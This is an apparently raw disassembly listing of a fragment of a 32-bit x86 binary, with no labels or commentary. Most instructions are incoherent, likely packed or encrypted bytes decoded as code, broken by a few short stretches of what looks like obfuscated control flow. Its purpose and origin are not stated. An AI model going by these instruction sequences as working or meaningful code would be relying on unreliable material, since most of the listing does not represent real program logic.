  40209c:	cmp    al,ah
  40209e:	loop   0x40203a
  4020a0:	adc    al,0xb2
  4020a2:	fidiv  WORD PTR [ecx-0x11]
  4020a5:	or     dl,BYTE PTR [esi]
  4020a7:	sbb    ch,BYTE PTR [ebx-0xbf0641d]
  4020ad:	je     0x402063
  4020af:	idiv   BYTE PTR [esp+esi*4]
  4020b2:	loopne 0x402034
  4020b4:	outs   dx,BYTE PTR ds:[esi]
  4020b5:	or     ah,bl
  4020b7:	rol    BYTE PTR [edi],0xca
  4020ba:	xor    dl,BYTE PTR [si-0x2e50]
  4020bf:	loop   0x40207f
  4020c1:	push   edi
  4020c2:	clc    
  4020c3:	out    0xec,al
  4020c5:	in     eax,0x3
  4020c7:	(bad)  
  4020c9:	repz push 0xf17f091
  4020cf:	inc    ecx
  4020d0:	aad    0xc5
  4020d2:	xor    eax,0xd23d0fde
  4020d7:	std    
  4020d8:	mov    bh,0xb5
  4020da:	xor    BYTE PTR [edx],al
  4020dc:	mov    al,BYTE PTR [eax-0x55]
  4020df:	sti    
  4020e0:	mov    esi,DWORD PTR [esi]
  4020e2:	(bad)  
  4020e3:	pop    ebx
  4020e4:	sub    ch,ah
  4020e6:	icebp  
  4020e7:	ins    BYTE PTR es:[edi],dx
  4020e8:	push   edx
  4020e9:	adc    ah,ch
  4020eb:	pop    edx
  4020ec:	pop    edi
  4020ed:	nop
  4020ee:	outs   dx,DWORD PTR ds:[esi]
  4020ef:	lea    esp,[ebx+0x47d8d35c]
  4020f5:	test   eax,0x1dd6711a
  4020fa:	retf   0xda90
  4020fd:	(bad)  
  4020fe:	push   cs
  4020ff:	or     BYTE PTR [edi-0x3d],al
  402102:	scas   eax,DWORD PTR es:[edi]
  402103:	aam    0x88
  402105:	mov    edx,0x11c213d1
  40210a:	scas   eax,DWORD PTR es:[edi]
  40210b:	add    bh,BYTE PTR [ebp-0xd]
  40210e:	and    DWORD PTR [ebx+0x63d084ad],esi
  402114:	jb     0x402191
  402116:	mov    ecx,DWORD PTR [esi]
  402118:	push   esi
  402119:	push   ebx
  40211a:	inc    eax
  40211b:	ret    0xf8b8
  40211e:	cmp    ebx,DWORD PTR [ebx]
  402120:	push   esi
  402121:	mov    BYTE PTR [ecx+0x67],ah
  402124:	arpl   WORD PTR [edi-0x74],di
  402127:	fiadd  WORD PTR [ebp*8+0x70e5c0b4]
  40212e:	mov    gs,ecx
  402130:	pushf  
  402131:	test   WORD PTR [esi-0xb],sp
  402135:	sub    eax,0x9ea3d9ad
  40213a:	loope  0x40214c
  40213c:	test   eax,0x2367cc7e
  402141:	lods   al,BYTE PTR ds:[esi]
  402142:	je     0x4020dd
  402144:	test   DWORD PTR [ebx],eax
  402146:	adc    DWORD PTR [eax-0x16],ebp
  402149:	pop    es
  40214a:	scas   al,BYTE PTR es:[edi]
  40214b:	in     eax,dx
  40214c:	retf   0x24dd
  40214f:	loopne 0x402142
  402151:	inc    ebx
  402152:	into   
  402153:	inc    ecx
  402154:	(bad)  
  402155:	mov    edx,0x1fbb8638
  40215a:	mov    al,ds:0xafde95fe
  40215f:	inc    ebx
  402160:	std    
  402161:	jo     0x4021c5
  402163:	int    0x52
  402165:	or     al,0xb3
  402167:	push   0xffffffc1
  402169:	mov    al,ds:0x1a4623e3
  40216e:	sar    WORD PTR [esi+0x3e],1
  402172:	mov    cl,0x55
  402174:	mov    esi,0x28e0e01c
  402179:	pushf  
  40217a:	fbld   TBYTE PTR [ebx]
  40217c:	ins    BYTE PTR es:[edi],dx
  40217d:	sbb    DWORD PTR [eax+0xd705f05],0xf28330dc
  402187:	ret    
  402188:	mov    esi,0xe8a6f25a
  40218d:	or     dl,BYTE PTR [ecx]
  40218f:	mov    esp,0x3ee752b3
  402194:	mov    edi,0x96360e2a
  402199:	push   ebp
  40219a:	mov    edi,0xe5608da
  40219f:	enter  0x23f2,0x88
  4021a3:	sbb    al,0x83
  4021a5:	rcr    BYTE PTR [ebp+0x44],1
  4021a8:	cmp    BYTE PTR [ebx],dl
  4021aa:	lock in al,dx
  4021ac:	xchg   esp,eax
  4021ad:	xchg   esi,eax
  4021ae:	mov    ecx,0x9069e17b
  4021b3:	ss fwait
  4021b5:	(bad)  
  4021b6:	adc    al,0x49
  4021b8:	(bad)  
  4021b9:	jmp    0x9c8c:0x3cf86140
  4021c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021c1:	adc    dl,dl
  4021c3:	sbb    eax,DWORD PTR [edx+0x6a]
  4021c6:	aas    
  4021c7:	aad    0xdc
  4021c9:	and    esp,DWORD PTR [ebx+0x54]
  4021cc:	mov    dl,0xc6
  4021ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021cf:	xor    ecx,edi
  4021d1:	adc    BYTE PTR [ecx+eiz*1-0x31c0bc32],cl
  4021d8:	lds    eax,FWORD PTR [eax+0x3e]
  4021db:	sbb    DWORD PTR [ecx],ecx
  4021dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021de:	jo     0x4021e3
  4021e0:	cs cli 
  4021e2:	stos   BYTE PTR es:[edi],al
  4021e3:	retf   0xa3dd
  4021e6:	xchg   DWORD PTR [eax-0x5],esi
  4021e9:	scas   al,BYTE PTR es:[edi]
  4021ea:	out    dx,al
  4021eb:	fpatan 
  4021ed:	xor    DWORD PTR [esi-0x36077f14],0x6b
  4021f4:	lods   al,BYTE PTR ds:[esi]
  4021f5:	lea    ebx,[edx]
  4021f7:	sar    bl,cl
  4021f9:	and    bl,BYTE PTR [esi+0x1]
  4021fc:	sahf   
  4021fd:	cld    
  4021fe:	ins    DWORD PTR es:[edi],dx
  4021ff:	out    0x9d,eax
  402201:	mov    ds:0x367c4a64,eax
  402206:	push   ecx
  402207:	retf   0x19c1
  40220a:	mov    ebx,0x8b04a78f
  40220f:	mov    edi,0x55b738cf
  402214:	add    eax,0x65ebf106
  402219:	jb     0x402226
  40221b:	cmp    al,0xdf
  40221e:	pop    esp
  40221f:	mov    ah,0x98
  402221:	pop    eax
  402222:	loope  0x402228
  402224:	rol    edx,cl
  402226:	lock jmp FWORD PTR [ecx]
  402229:	mov    edi,0x558478a9
  40222e:	xor    al,al
  402230:	xchg   ebx,eax
  402231:	in     al,0x4c
  402233:	pop    es
  402234:	in     al,dx
  402235:	mov    dl,0x5f
  402237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402238:	cmp    ecx,DWORD PTR [esi+0x3c3aacc2]
  40223e:	idiv   DWORD PTR [esi-0x3d]
  402241:	inc    edx
  402242:	bnd jo 0x402219
  402245:	mov    ah,0xf8
  402247:	call   0x92bf:0xf392e384
  40224e:	cmp    al,0xd0
  402250:	cdq    
  402251:	icebp  
  402252:	rol    cl,0xec
  402255:	mov    al,ds:0xc5bc13a3
  40225a:	call   FWORD PTR [esp+ebp*1-0x566968f4]
  402261:	xor    BYTE PTR [edx-0x2f],0xc
  402265:	stos   DWORD PTR es:[edi],eax
  402266:	cmc    
  402267:	xchg   BYTE PTR [esi+0x60],cl
  40226a:	sub    bl,0xf9
  40226d:	jno    0x4022b1
  40226f:	or     eax,0xac8184ce
  402274:	jg     0x4022c7
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [ebp+edi*2+0x7c],esi
  40229d:	(bad)  
  40229e:	jo     0x4022a2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	and    bl,ah
  4022a8:	into   
  4022a9:	(bad)  [edi+eax*2+0x25]
  4022ad:	inc    edx
  4022ae:	pop    ebp
  4022af:	push   es
  4022b0:	lea    esp,[esi]
  4022b2:	sbb    DWORD PTR ds:0x3a0054c2,esp
  4022b8:	inc    esi
  4022b9:	xor    al,0x2b
  4022bb:	mov    esi,0x655c09a1
  4022c0:	xor    bl,dl
  4022c2:	in     al,dx
  4022c3:	movaps xmm3,xmm7
  4022c6:	push   esp
  4022c7:	jge    0x4022b9
  4022c9:	ror    DWORD PTR [esp+eiz*2],cl
  4022cc:	xchg   ebp,eax
  4022cd:	xor    al,0xff
  4022cf:	scas   al,BYTE PTR es:[edi]
  4022d0:	ror    DWORD PTR ss:[ebx-0x74],0x25
  4022d5:	push   ebx
  4022d6:	xor    al,0xd6
  4022d8:	xchg   esp,eax
  4022d9:	adc    bh,ah
  4022db:	call   0x85800de3
  4022e0:	add    dl,BYTE PTR [edi]
  4022e2:	xor    eax,0xa9b3ca51
  4022e7:	sub    dh,BYTE PTR [ecx-0x63199c53]
  4022ed:	mov    eax,0xe42323d9
  4022f2:	pop    esp
  4022f3:	push   edx
  4022f4:	xchg   BYTE PTR [esi+0x385a46e3],bh
  4022fa:	(bad)  
  4022fb:	mov    ds:0x5ccd36e2,al
  402300:	inc    ecx
  402301:	or     ch,BYTE PTR [esi+0x54]
  402304:	mov    di,0xe649
  402309:	dec    ebp
  40230a:	cmc    
  40230b:	pop    ecx
  40230c:	jno    0x4022f4
  40230e:	loopne 0x402333
  402310:	je     0x402294
  402312:	imul   esi,DWORD PTR [ecx+0x3f],0xffffffde
  402316:	das    
  402317:	and    al,0x43
  402319:	xchg   ebp,eax
  40231a:	add    ebp,DWORD PTR [ebx-0x5bcaaa]
  402320:	repz mov esp,0x2df68c7b
  402326:	jo     0x40238f
  402328:	push   0x286a4121
  40232d:	dec    esi
  40232e:	xlat   BYTE PTR ds:[ebx]
  40232f:	push   es
  402330:	inc    edi
  402331:	pushf  
  402332:	adc    ebp,DWORD PTR [ecx+0x61338be4]
  402338:	lds    ecx,FWORD PTR [ebp+0x515fa5b]
  40233e:	and    ecx,edi
  402340:	dec    edx
  402341:	and    DWORD PTR [eax+0x30906b90],esi
  402347:	dec    esp
  402348:	cmp    eax,0x7c76eaa7
  40234d:	stos   DWORD PTR es:[edi],eax
  40234e:	mov    cl,0xc7
  402350:	fsubr  st(0),st
  402352:	fiadd  WORD PTR [edi+0x4c]
  402355:	push   es
  402356:	cli    
  402357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402358:	mov    ecx,0x1d643e3
  40235d:	xchg   esp,eax
  40235e:	mov    dl,0xa5
  402360:	rcr    DWORD PTR [esi+0x6e523aa4],0xf0
  402367:	adc    al,0xca
  402369:	iret   
  40236a:	lahf   
  40236b:	scas   al,BYTE PTR es:[edi]
  40236c:	cli    
  40236d:	in     al,0x73
  40236f:	cmp    DWORD PTR [edx],esi
  402371:	dec    edx
  402372:	push   0x921f51d2
  402377:	dec    ebx
  402378:	or     BYTE PTR [ebp-0x1f],0xd4
  40237c:	in     al,dx
  40237d:	ins    DWORD PTR es:[edi],dx
  40237e:	jle    0x402336
  402380:	(bad)  
  402381:	mov    cl,ch
  402383:	leave  
  402384:	or     ebp,DWORD PTR [esp+edi*4]
  402387:	sti    
  402388:	push   ebx
  402389:	jo     0x4023d1
  40238b:	dec    edx
  40238c:	xchg   esi,eax
  40238d:	adc    ebp,esi
  40238f:	jecxz  0x40238f
  402391:	das    
  402392:	fist   DWORD PTR [edi+ebp*1+0x6f]
  402396:	loop   0x40238b
  402398:	mov    edi,0x1f967caf
  40239d:	(bad)  
  40239e:	aad    0xbe
  4023a0:	add    al,0x1b
  4023a2:	clc    
  4023a3:	ss pop ds
  4023a5:	dec    ebx
  4023a6:	fnstenv [edx]
  4023a8:	scas   al,BYTE PTR es:[edi]
  4023a9:	mov    bl,0xc3
  4023ab:	cmc    
  4023ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ad:	stos   BYTE PTR es:[edi],al
  4023ae:	aas    
  4023af:	mov    BYTE PTR ss:[ebp+edi*1+0x1702d533],dl
  4023b7:	aaa    
  4023b8:	test   DWORD PTR [edx],esi
  4023ba:	xchg   ecx,eax
  4023bb:	pop    ds
  4023bc:	adc    ah,bh
  4023be:	mov    ch,BYTE PTR [ebx-0xb]
  4023c1:	pushf  
  4023c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023c3:	(bad)  
  4023c4:	xchg   ebp,eax
  4023c5:	retf   0xd4d0
  4023c8:	mov    bh,0x5
  4023ca:	xlat   BYTE PTR ds:[ebx]
  4023cb:	in     eax,dx
  4023cc:	aaa    
  4023cd:	sahf   
  4023ce:	lea    ecx,[eax+0x476c4a26]
  4023d4:	adc    ch,BYTE PTR es:[edx]
  4023d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023d8:	dec    esp
  4023d9:	xor    BYTE PTR [ecx+0x27c91bf0],al
  4023df:	inc    esi
  4023e0:	test   al,0xc6
  4023e2:	loopne 0x40242b
  4023e4:	push   0x2def0342
  4023e9:	xor    ah,BYTE PTR [esi-0x1f31c1d7]
  4023ef:	ds int3 
  4023f1:	sub    DWORD PTR [eax-0x72db487b],eax
  4023f7:	sbb    al,0x22
  4023f9:	and    BYTE PTR ds:0xabdabb19,dl
  4023ff:	mov    ds:0x987cf8a5,al
  402404:	adc    eax,DWORD PTR ds:0x901f0acc
  40240a:	pop    edi
  40240c:	int    0x31
  40240e:	mov    bh,0x9b
  402410:	xor    dh,bl
  402412:	sbb    DWORD PTR [esi],ebx
  402414:	cmp    al,0xec
  402416:	xor    ah,bl
  402418:	inc    esi
  402419:	and    ebx,edx
  40241b:	fnstenv [ecx]
  40241d:	ins    DWORD PTR es:[edi],dx
  40241e:	jmp    0xb16c6316
  402423:	mov    ebp,edx
  402425:	das    
  402426:	outs   dx,DWORD PTR ds:[esi]
  402427:	bound  eax,QWORD PTR [ecx-0x44751a45]
  40242d:	in     al,0xc6
  40242f:	fwait
  402430:	and    BYTE PTR [eax-0x11a040fe],bl
  402436:	pop    edi
  402437:	fs aas 
  402439:	xchg   ebx,eax
  40243a:	inc    ebx
  40243b:	repnz and dh,BYTE PTR [esp+edi*1]
  40243f:	cwde   
  402440:	adc    eax,0xec3d22d7
  402445:	cdq    
  402446:	pop    esp
  402447:	jmp    ebp
  402449:	pop    esp
  40244a:	and    dh,bh
  40244c:	out    dx,al
  40244d:	cmp    DWORD PTR [ebp-0x25fda2ad],ebp
  402453:	ds daa 
  402455:	mov    DWORD PTR [esi],ebp
  402457:	cs das 
  402459:	jl     0x402479
  40245b:	das    
  40245c:	dec    esi
  40245d:	lods   eax,DWORD PTR ds:[esi]
  40245e:	loopne 0x402483
  402460:	xchg   esi,eax
  402461:	mov    edi,edi
  402463:	loopne 0x402468
  402465:	or     eax,0xa7820a9f
  40246a:	(bad)  
  40246b:	sub    eax,0x18af0e4
  402470:	test   eax,0x958268dd
  402475:	mov    cl,0x75
  402477:	arpl   WORD PTR [esi+0x72c36370],dx
  40247d:	(bad)  
  40247e:	mov    ebx,0xa6614a82
  402483:	in     eax,dx
  402484:	out    dx,eax
  402485:	stos   DWORD PTR es:[edi],eax
  402486:	int3   
  402487:	bound  eax,QWORD PTR [edx]
  402489:	adc    BYTE PTR [ecx-0x17],ah
  40248c:	arpl   WORD PTR [ebp-0x59],bx
  40248f:	sti    
  402490:	lds    ebx,FWORD PTR [edi]
  402492:	int    0x83
  402494:	enter  0x3e45,0xa
  402498:	rcl    DWORD PTR [ebx+0x74931f8b],1
  40249e:	ret    0xd8cb
  4024a1:	call   0x6715ef52
  4024a6:	mov    dx,WORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x61d19937],cl
  4024f4:	mov    edx,0x70700070
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	popa   
  4024fe:	jo     0x402556
  402500:	dec    edx
  402501:	outs   dx,BYTE PTR ds:[esi]
  402502:	call   0x913e:0x66c45b9e
  402509:	jg     0x4024da
  40250b:	or     ebp,ecx
  40250d:	fbstp  TBYTE PTR [ebx-0x3b]
  402510:	mov    edx,0x25208de
  402515:	dec    esp
  402516:	ins    DWORD PTR es:[edi],dx
  402517:	loop   0x402502
  402519:	out    0xca,eax
  40251b:	test   dl,0x6d
  40251e:	mov    ds:0x835c4059,eax
  402523:	dec    ebx
  402524:	test   al,0xa4
  402526:	jecxz  0x4024e0
  402528:	mov    ch,0x4
  40252a:	fisttp QWORD PTR [esi-0x16b057d]
  402530:	loop   0x40256d
  402532:	cmp    eax,0xc844170c
  402537:	nop
  402538:	ins    BYTE PTR es:[edi],dx
  402539:	cmp    al,0x91
  40253b:	mov    DWORD PTR [edi],esi
  40253d:	in     al,0x83
  40253f:	mov    eax,ds:0x9675043e
  402544:	mov    ch,0xe3
  402546:	(bad)  
  402547:	sbb    DWORD PTR [edi+0x468e2299],eax
  40254d:	pop    esi
  40254e:	xchg   edx,eax
  40254f:	mov    esi,DWORD PTR [edx]
  402551:	push   eax
  402552:	mov    ah,0x92
  402554:	shl    DWORD PTR [esi-0x38],1
  402557:	mov    edx,DWORD PTR [esi+0x7]
  40255a:	rol    al,1
  40255c:	popf   
  40255d:	pop    ebp
  40255e:	daa    
  40255f:	mov    ecx,0x2fc7a72a
  402564:	jno    0x4025d2
  402566:	mov    cl,0xf2
  402568:	mov    bh,dh
  40256a:	jmp    0x4025b2
  40256c:	cdq    
  40256d:	in     eax,0x7e
  40256f:	repnz push edx
  402571:	ret    
  402572:	cld    
  402573:	adc    BYTE PTR [ebx+0x64],cl
  402576:	fnstsw WORD PTR [ecx+eiz*1+0x4c3688fb]
  40257d:	lea    edx,[eax+0xd3e9b26]
  402583:	xchg   esp,eax
  402584:	mov    edi,0x3967e006
  402589:	add    al,0xa1
  40258b:	xor    ebp,DWORD PTR [ebx]
  40258d:	nop
  40258e:	out    0xa0,eax
  402590:	idiv   BYTE PTR [edi-0x30]
  402593:	mov    ch,ah
  402595:	xor    bl,ch
  402597:	cs pop ss
  402599:	or     al,0x2
  40259b:	jae    0x402526
  40259d:	stc    
  40259e:	scas   eax,DWORD PTR es:[edi]
  40259f:	jp     0x402572
  4025a1:	jbe    0x402524
  4025a3:	jbe    0x402566
  4025a5:	and    DWORD PTR [ecx+0x2509c257],ebx
  4025ab:	and    DWORD PTR [ecx-0x1f],ebx
  4025ae:	xor    BYTE PTR [ebp-0x29],0xaf
  4025b2:	cwde   
  4025b3:	push   ecx
  4025b4:	stos   BYTE PTR es:[edi],al
  4025b5:	pop    eax
  4025b6:	xor    cl,BYTE PTR [ebx]
  4025b8:	jbe    0x4025e5
  4025ba:	pop    ebx
  4025bb:	dec    ebx
  4025bc:	dec    eax
  4025bd:	enter  0xa811,0xd7
  4025c1:	lahf   
  4025c2:	or     ebx,DWORD PTR [eax]
  4025c4:	test   BYTE PTR [eax],bh
  4025c6:	mov    dl,0xfc
  4025c8:	cs call 0xa6f7:0x5573c19f
  4025d0:	dec    ebp
  4025d1:	mov    bh,0x46
  4025d3:	push   esi
  4025d4:	cdq    
  4025d5:	adc    eax,0xf6207ce0
  4025da:	shr    cl,cl
  4025dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025dd:	push   ecx
  4025de:	sub    edx,0xe1486a5c
  4025e4:	cmp    eax,eax
  4025e6:	jge    0x40258a
  4025e8:	ins    BYTE PTR es:[edi],dx
  4025e9:	jp     0x40262d
  4025eb:	push   edx
  4025ec:	arpl   WORD PTR [ecx+0x31403ad0],cx
  4025f2:	cmp    eax,0x3ce1b5e1
  4025f7:	push   edx
  4025f8:	aad    0x40
  4025fa:	call   0xb6c5:0x6bfba6f2
  402601:	mov    edx,0x94313fab
  402606:	js     0x4025a0
  402608:	mov    ah,ah
  40260a:	push   ebp
  40260b:	or     DWORD PTR [edx],ecx
  40260d:	out    dx,eax
  40260e:	pop    eax
  40260f:	xchg   edi,eax
  402610:	push   esi
  402611:	jno    0x402639
  402613:	cmp    bh,BYTE PTR [esi+0x38eee481]
  402619:	inc    esp
  40261a:	leave  
  40261b:	sub    al,0xee
  40261d:	push   esi
  40261e:	loop   0x40264f
  402620:	pusha  
  402621:	stc    
  402622:	dec    eax
  402623:	fwait
  402624:	pop    eax
  402625:	push   esp
  402626:	dec    ecx
  402627:	add    ebx,DWORD PTR [edx-0x36883c69]
  40262d:	mov    ch,0x4f
  40262f:	ds pop ecx
  402631:	mov    eax,0xd3018404
  402636:	jns    0x40262d
  402638:	and    BYTE PTR [esi-0x42],ch
  40263b:	jmp    0x108ffffd
  402640:	cmp    DWORD PTR [esi],ecx
  402642:	pop    ss
  402643:	in     al,dx
  402644:	push   es
  402645:	mov    edx,0x13bf04de
  40264a:	xlat   BYTE PTR ds:[ebx]
  40264b:	sub    esp,eax
  40264d:	push   edx
  40264e:	dec    esi
  40264f:	mov    al,ds:0x33fb91f1
  402654:	shl    BYTE PTR [ebp+0x23bf40ee],0x30
  40265b:	or     eax,0x9015e707
  402660:	clc    
  402661:	or     BYTE PTR [eax+esi*2-0x60],bl
  402665:	xchg   ebx,eax
  402666:	nop
  402667:	mov    bl,0xe5
  402669:	(bad)  
  40266b:	(bad)  
  40266c:	lea    ecx,[esi+edx*2]
  40266f:	js     0x4026a6
  402671:	jnp    0x402611
  402673:	rol    BYTE PTR fs:[edx],1
  402676:	cli    
  402677:	repz call DWORD PTR [eax+0x31094753]
  40267e:	into   
  40267f:	std    
  402680:	xor    edx,DWORD PTR [edi+0x63]
  402683:	xchg   ebx,eax
  402684:	jl     0x402651
  402686:	adc    al,0x21
  402688:	and    edx,DWORD PTR [ebx+ecx*2]
  40268b:	push   0x8eb10927
  402690:	mov    ds:0xf31dc422,eax
  402695:	repz rol DWORD PTR [edi+0x20],1
  402699:	mov    ecx,0xc09c9f7c
  40269e:	es lock jne 0x40268e
  4026a2:	je     0x402702
  4026a4:	add    dl,BYTE PTR [eax+0x5ca1048f]
  4026aa:	mov    dh,0x0
  4026ac:	mov    ds:0x5e38ee85,eax
  4026b1:	dec    edi
  4026b2:	add    cl,BYTE PTR [edi-0x387acb63]
  4026b8:	dec    ebx
  4026b9:	mov    eax,ebp
  4026bb:	add    DWORD PTR [ecx+0x2904d9a9],0xffffff93
  4026c2:	mov    ebp,0x27115d6d
  4026c7:	xchg   BYTE PTR [ebx],cl
  4026c9:	jns    0x402720
  4026cb:	sti    
  4026cc:	jp     0x4026aa
  4026ce:	mov    BYTE PTR [ebx],0x3e
  4026d1:	and    edx,DWORD PTR ds:0xc4619172
  4026d7:	inc    ebx
  4026d8:	aas    
  4026d9:	push   ds
  4026da:	adc    BYTE PTR [ecx-0x6ff68b],ah
  4026e0:	mov    dh,0xd0
  4026e2:	fucom  st(0)
  4026e4:	sub    DWORD PTR [ebx],esp
  4026e6:	mov    ecx,0x2cd9911e
  4026eb:	dec    ebp
  4026ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026ed:	dec    ebx
  4026ee:	adc    BYTE PTR [edi+ebx*8+0x39],0xbc
  4026f3:	push   ss
  4026f4:	scas   eax,DWORD PTR es:[edi]
  4026f5:	cld    
  4026f6:	in     al,0x7c
  4026f8:	pusha  
  4026f9:	fxch   st(4)
  4026fb:	push   esi
  4026fc:	jmp    0x402689
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xd01ae7cd
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	pop    esp
  402768:	icebp  
  402769:	sub    dh,ch
  40276b:	push   esi
  40276c:	cmp    al,0x7a
  40276e:	mov    BYTE PTR [ecx+0x4bbd3a70],0x4e
  402775:	fsub   DWORD PTR [eax-0x3d6ad2b2]
  40277b:	cmp    eax,0xdefc1be4
  402780:	cwde   
  402781:	aas    
  402782:	mov    WORD PTR [esp+edx*2+0x8],?
  402786:	xchg   ecx,eax
  402787:	push   ds
  402788:	mov    ds:0xf741dba5,al
  40278d:	pop    eax
  40278e:	xor    esp,0xffffff94
  402791:	jmp    0x4027cf
  402793:	mov    dh,0xcf
  402795:	out    dx,eax
  402796:	adc    DWORD PTR ds:0x1061,edi
  40279b:	fld    QWORD PTR [ecx+0x9b39172]
  4027a1:	in     al,dx
  4027a2:	div    cl
  4027a4:	jbe    0x402806
  4027a6:	sbb    DWORD PTR [ebp-0x80],edx
  4027a9:	xor    BYTE PTR [esi-0x1f],0x5c
  4027ad:	jecxz  0x402806
  4027af:	or     edx,DWORD PTR [edi]
  4027b1:	push   ebx
  4027b2:	mov    al,0x9e
  4027b4:	xor    esp,ebp
  4027b6:	(bad)  
  4027b7:	mov    edi,0x82b40fe4
  4027bc:	jle    0x4027e6
  4027be:	jmp    eax
  4027c0:	std    
  4027c1:	cmp    al,0x8a
  4027c3:	(bad)  [ebx-0x52c36eb0]
  4027c9:	push   ss
  4027ca:	or     ebx,esp
  4027cc:	ins    BYTE PTR es:[edi],dx
  4027cd:	ds (bad) 
  4027cf:	fldenv [esi-0x64]
  4027d2:	mov    esi,DWORD PTR ds:0xcb439003
  4027d8:	ret    
  4027d9:	cld    
  4027da:	xor    dh,dh
  4027dc:	xchg   edi,eax
  4027dd:	push   eax
  4027de:	and    bl,BYTE PTR [ebx]
  4027e0:	pop    ecx
  4027e1:	xchg   DWORD PTR [edx-0x64],eax
  4027e4:	(bad)  
  4027e5:	jmp    0xcbe5e5d4
  4027ea:	sub    dh,0x49
  4027ed:	inc    esi
  4027ee:	adc    ecx,eax
  4027f0:	test   al,0xb
  4027f2:	(bad)  
  4027f3:	push   0xeb291763
  4027f8:	add    esp,DWORD PTR [ecx+0x34]
  4027fb:	xor    eax,0x9a5f27e7
  402800:	jns    0x402823
  402802:	int3   
  402803:	mov    BYTE PTR [esi-0x78745771],al
  402809:	lods   eax,DWORD PTR ds:[esi]
  40280a:	jmp    0xfd96:0x902b0d40
  402811:	cwde   
  402812:	mov    ebp,0x6077d899
  402817:	mov    dh,0xa
  402819:	inc    BYTE PTR [ebp-0x7c]
  40281c:	and    esi,DWORD PTR [ecx+ebp*1-0x7]
  402820:	sbb    bh,ah
  402822:	addr16 add al,0x58
  402825:	sbb    bl,0x2
  402828:	(bad)  
  402829:	lock cdq 
  40282b:	fdivr  st,st(2)
  40282d:	fisttp WORD PTR [edx+0x106aa917]
  402833:	call   0x91ab51f4
  402838:	or     al,BYTE PTR [edx-0x54e7c100]
  40283e:	pop    ecx
  40283f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402840:	sbb    DWORD PTR [edi+0x35],edx
  402843:	sbb    ebx,DWORD PTR [esp+edi*4]
  402846:	fdivp  st(5),st
  402848:	cli    
  402849:	enter  0xe8ce,0xb
  40284d:	add    dh,bl
  40284f:	xor    dh,BYTE PTR [ebx-0x13573d]
  402855:	or     esi,0xffffffb1
  402858:	hlt    
  402859:	sbb    DWORD PTR [esp+ebp*1],ecx
  40285c:	pop    ebp
  40285d:	jp     0x4028b5
  40285f:	js     0x4028a2
  402861:	rcl    cl,0x13
  402864:	adc    DWORD PTR [edx],ebp
  402866:	lods   eax,DWORD PTR ds:[esi]
  402867:	fcom   DWORD PTR [edx+0x7a]
  40286a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40286b:	sub    al,bl
  40286d:	in     eax,dx
  40286e:	repnz stc 
  402870:	hlt    
  402871:	xor    ebp,DWORD PTR [edi-0x2a323424]
  402877:	dec    eax
  402878:	(bad)  
  402879:	fadd   DWORD PTR [eax-0x350d56e6]
  40287f:	dec    ecx
  402880:	mov    DWORD PTR [edx],ebp
  402882:	mov    dh,0x2b
  402884:	imul   ebx,edi,0xb93e029
  40288a:	push   esi
  40288b:	xlat   BYTE PTR ds:[ebx]
  40288c:	cwde   
  40288d:	and    cl,dl
  40288f:	push   ds
  402890:	out    dx,al
  402891:	jno    0x40288a
